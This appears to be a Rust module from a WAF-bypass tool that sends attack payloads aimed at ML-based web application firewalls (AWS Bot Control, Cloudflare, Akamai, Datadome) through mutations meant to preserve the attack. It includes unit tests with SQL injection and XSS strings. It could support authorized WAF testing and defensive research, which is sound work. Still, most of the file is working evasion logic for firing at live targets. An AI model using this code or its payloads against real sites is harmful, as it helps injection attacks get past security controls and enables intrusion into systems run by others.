//! #129 ML-WAF evasion routing.
//!
//! When the target WAF fingerprint indicates a learned classifier (AWS Bot
//! Control, Cloudflare Bot Management, Akamai Bot Manager, Datadome), the
//! standard heuristic pipeline provides weak signal — there are no
//! normalization mismatches to exploit because the classifier doesn't use
//! rules. This module routes those targets through structural,
//! manifold-projected payload mutation instead.
//!
//! # Architecture
//!
//! The full decision-based boundary attack
//! ([`wafrift_wafmodel::mlwaf::evade_ml`]) needs a *live* oracle — it descends
//! toward the WAF's decision boundary using block/allow feedback. The strategy
//! crate is I/O-free and cannot make HTTP requests, so it owns only the
//! **mutation side**: it produces a semantics-preserving structural mutation
//! of the payload that stays on the executable-attack manifold (via
//! [`wafrift_wafmodel::mlwaf::propose_mutation`] +
//! [`wafrift_wafmodel::mlwaf::is_attack_payload`]). The I/O layer
//! (`wafrift scan` / `bench-waf`, which own the live client) fires that
//! candidate at the target and credits only *verified* bypasses.
//!
//! The *adaptive* descent (choosing each next mutation from live block/allow
//! feedback — the true HopSkipJump walk) is a frontier upgrade tracked in
//! `docs/legendary-todo.md`; this module is the sound, I/O-free mutation
//! generator it builds on.
//!
//! # Anti-rig
//!
//! Every returned candidate must still satisfy the manifold check
//! ([`wafrift_wafmodel::mlwaf::is_attack_payload`]) — a mutation that destroys
//! the attack into something inert is a discarded sample, never a "bypass".
//! Verifying an actual pass is the I/O layer's job against the live WAF; this
//! layer never fabricates a pass it cannot observe.

use wafrift_types::{Request, Technique, WafClass};
use wafrift_wafmodel::mlwaf::{MlEvasion, is_attack_payload, propose_mutation};

/// Default ML evasion budget: number of structural-mutation proposals to try
/// when searching for one on-manifold candidate.
///
/// Each proposal is a cheap in-process function call (a single
/// semantics-preserving mutation + a manifold check), so a budget of 512 is
/// fast (< 1 ms on a modern workstation). The I/O layer fires the resulting
/// candidate once per accepted mutation, so the *network* cost is bounded by
/// the caller's variant count, not by this budget.
pub const DEFAULT_ML_BUDGET: u64 = 512;

/// Produce one semantics-preserving structural mutation of `payload` that
/// stays on the executable-attack manifold, or `None` if the input is not an
/// attack or no on-manifold mutation is found within `budget` proposals.
///
/// This is the I/O-free mutation side of ML-WAF evasion. It does **not** query
/// a live WAF (the strategy crate cannot do I/O); it returns a candidate for
/// the I/O layer (`scan` / `bench-waf`) to fire and verify. `seed` makes the
/// search deterministic and lets a caller draw a *diverse* set of candidates
/// by iterating the seed.
///
/// `queries` is always 0 here (no live oracle was consulted);
/// `off_manifold_rejected` records how many liberal proposals were discarded
/// for leaving the attack manifold — the anti-rig ledger.
///
/// # Anti-rig
///
/// The start payload must already be a working attack
/// ([`is_attack_payload`]); otherwise any "mutation" is vacuous and `None` is
/// returned. Every accepted candidate is re-checked against the manifold, so a
/// mutation that deletes the attack token (e.g. whitespace splitting a keyword)
/// is rejected, never returned as a "bypass".
#[must_use]
pub fn ml_evasion_candidates(payload: &[u8], budget: u64, seed: u64) -> Option<MlEvasion> {
    // Anti-rig: a mutation of a non-attack is vacuous.
    if !is_attack_payload(payload) {
        return None;
    }
    let mut s = seed;
    let cap = budget.clamp(1, 4096);
    // `off` (the loop index) is the count of liberal proposals already
    // discarded for leaving the manifold — the anti-rig ledger reported in the
    // returned `MlEvasion`.
    for off in 0..cap {
        let cand = propose_mutation(payload, s);
        s = s.wrapping_add(0x9E37_79B9_7F4A_7C15);
        // Manifold projection: the candidate must differ AND remain a working
        // attack. A liberal proposal that split a keyword is discarded here.
        if cand != payload && is_attack_payload(&cand) {
            return Some(MlEvasion {
                input: cand,
                queries: 0,
                off_manifold_rejected: off,
            });
        }
    }
    None
}

/// Apply ML evasion mutations to a request when the WAF is ML-backed.
///
/// This is the **strategy-layer integration point** for Part 2. It:
///
/// 1. Checks whether the detected WAF name indicates an ML-backed classifier.
/// 2. If yes, extracts the request body, runs `ml_evasion_candidates`, and
///    replaces the body with the mutated candidate.
/// 3. Records `Technique::MlEvasion` so callers can credit the technique.
/// 4. Falls back to the original request unmodified when:
///    - The WAF is not ML-backed.
///    - The payload fails the manifold check (empty, binary, inert).
///    - The budget is exhausted with no valid candidate.
///
/// # Arguments
///
/// * `request` — The HTTP request to transform.
/// * `waf_name` — The detected WAF name (used for routing).
/// * `budget` — ML oracle budget (defaults to [`DEFAULT_ML_BUDGET`]).
/// * `seed` — Deterministic RNG seed.
#[must_use]
pub fn apply_ml_evasion_if_applicable(
    request: &Request,
    waf_name: &str,
    budget: u64,
    seed: u64,
) -> (Request, Vec<Technique>) {
    let waf_class = WafClass::from_waf_name(waf_name);
    if !waf_class.is_ml_backed() {
        return (request.clone(), Vec::new());
    }

    let Some(ref body) = request.body else {
        return (request.clone(), Vec::new());
    };

    let Some(evasion) = ml_evasion_candidates(body, budget, seed) else {
        return (request.clone(), Vec::new());
    };

    let mut req = request.clone();
    req.body = Some(evasion.input);
    let techniques = vec![Technique::MlEvasion {
        waf_class: format!("{waf_class:?}"),
        queries: evasion.queries,
        off_manifold_rejected: evasion.off_manifold_rejected,
    }];
    (req, techniques)
}

/// Build the ML-evasion probe, mutate it, and return the mutated payload
/// string plus the techniques applied — `None` when the WAF is not ML-backed
/// or no on-manifold mutation was produced.
///
/// The payload is carried IN THE BODY because
/// [`apply_ml_evasion_if_applicable`] mutates the request body; the mutated
/// payload is then extracted from that body. This is the SINGLE helper both
/// `wafrift scan` and `bench-waf` call, so the probe-shape + extract wiring
/// lives in ONE place (§7 DEDUP) and is unit-tested below (§9/§14): a revert
/// to a no-body probe — the exact bug that made this a silent no-op — trips
/// `ml_evasion_probe_payload_mutates_for_ml_backed`.
#[must_use]
pub fn ml_evasion_probe_payload(
    raw_payload: &str,
    waf_name: &str,
    budget: u64,
    seed: u64,
) -> Option<(String, Vec<Technique>)> {
    let probe = Request::post("https://probe.internal/", raw_payload.as_bytes().to_vec());
    let (mutated, techniques) = apply_ml_evasion_if_applicable(&probe, waf_name, budget, seed);
    if techniques.is_empty() {
        return None;
    }
    let payload = mutated
        .body
        .as_deref()
        .map(|b| String::from_utf8_lossy(b).into_owned())?;
    Some((payload, techniques))
}

#[cfg(test)]
mod tests {
    use super::*;
    use wafrift_types::Request;

    #[test]
    fn ml_evasion_produces_a_real_on_manifold_mutation() {
        // The fix that matters: the strategy layer must return a candidate
        // that (a) is DIFFERENT from the input and (b) still carries an attack
        // token. A regression to the old always-block fake oracle returned
        // None unconditionally — caught here.
        let payload = b"' UNION SELECT 1,2--";
        let evasion = ml_evasion_candidates(payload, 256, 99)
            .expect("an attack payload must yield an on-manifold structural mutation");
        assert_ne!(
            evasion.input, payload,
            "the returned candidate must be an actual mutation, not the input"
        );
        let mutated = String::from_utf8_lossy(&evasion.input).to_ascii_lowercase();
        assert!(
            mutated.contains("union") || mutated.contains("select"),
            "manifold projection must preserve attack tokens; got: {mutated:?}"
        );
    }

    #[test]
    fn ml_evasion_rejects_non_attack_input() {
        // A benign payload is not on the manifold — there is nothing to evade,
        // so the mutator must return None rather than fabricate a "bypass".
        assert!(
            ml_evasion_candidates(b"hello world", 256, 1).is_none(),
            "a non-attack payload must yield no ML-evasion candidate"
        );
    }

    #[test]
    fn ml_evasion_is_deterministic_for_a_seed() {
        // Same seed → same candidate (reproducible campaigns / replay).
        let payload = b"<script>alert(1)</script>";
        let a = ml_evasion_candidates(payload, 256, 7);
        let b = ml_evasion_candidates(payload, 256, 7);
        assert_eq!(
            a.map(|e| e.input),
            b.map(|e| e.input),
            "ml_evasion_candidates must be deterministic for a fixed seed"
        );
    }

    #[test]
    fn apply_ml_evasion_no_body_returns_original() {
        let req = Request::get("https://example.com/");
        let (result_req, techniques) =
            apply_ml_evasion_if_applicable(&req, "AWS Bot Control", 64, 0);
        assert_eq!(result_req.url, req.url);
        assert!(techniques.is_empty(), "no body → no techniques applied");
    }

    #[test]
    fn apply_ml_evasion_cloudflare_bot_mgmt_mutates_body() {
        let original_body = b"q=<script>alert(1)</script>".to_vec();
        let req = Request::post("https://target.internal/", original_body.clone())
            .header("Content-Type", "application/x-www-form-urlencoded");

        // Cloudflare Bot Management is ML-backed — must route and mutate.
        let waf = "Cloudflare Bot Management";
        assert!(
            WafClass::from_waf_name(waf).is_ml_backed(),
            "Cloudflare Bot Management must be identified as ML-backed"
        );

        let (mutated, techs) = apply_ml_evasion_if_applicable(&req, waf, 256, 7);
        assert!(
            !techs.is_empty(),
            "an ML-backed target with a body must mutate"
        );
        assert_ne!(
            mutated.body.as_deref(),
            Some(original_body.as_slice()),
            "the body must actually change (regression guard for the no-op fake)"
        );
    }

    #[test]
    fn ml_evasion_probe_payload_mutates_for_ml_backed() {
        // The probe→mutate→extract wiring both `scan` and `bench-waf` use.
        // Regression guard: the old no-op returned the unmutated payload (or
        // None). Pins that an ML-backed target yields a real, different,
        // still-on-manifold payload + the technique tag.
        let (payload, techs) = ml_evasion_probe_payload("' OR 1=1--", "AWS Bot Control", 256, 7)
            .expect("ML-backed + attack payload must yield a mutated probe payload");
        assert_ne!(
            payload, "' OR 1=1--",
            "probe payload must be MUTATED, not the original (no-op regression guard)"
        );
        assert!(
            payload.to_ascii_lowercase().contains("or 1"),
            "manifold projection must preserve the attack token: {payload:?}"
        );
        assert!(
            techs
                .iter()
                .any(|t| matches!(t, Technique::MlEvasion { .. })),
            "must carry the MlEvasion technique"
        );
    }

    #[test]
    fn ml_evasion_probe_payload_none_for_rule_waf() {
        assert!(
            ml_evasion_probe_payload("' OR 1=1--", "ModSecurity", 256, 0).is_none(),
            "a rule-based WAF must not route through ML evasion"
        );
    }
}
